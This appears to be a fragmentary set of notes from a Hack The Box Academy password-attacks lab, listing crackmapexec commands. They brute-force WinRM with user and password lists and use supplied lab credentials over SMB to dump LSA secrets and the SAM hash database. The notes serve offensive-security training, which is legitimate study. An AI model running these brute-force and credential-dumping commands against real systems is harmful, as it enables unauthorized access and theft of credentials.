...
```python
TheCyberScythe@htb[/htb]$  crackmapexec -h
...
```python
TheCyberScythe@htb[/htb]$ crackmapexec smb -h
...
```python
TheCyberScythe@htb[/htb]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

Network Services

```python
TheCyberScythe@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list
...
```python
TheCyberScythe@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
...
```python
TheCyberScythe@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
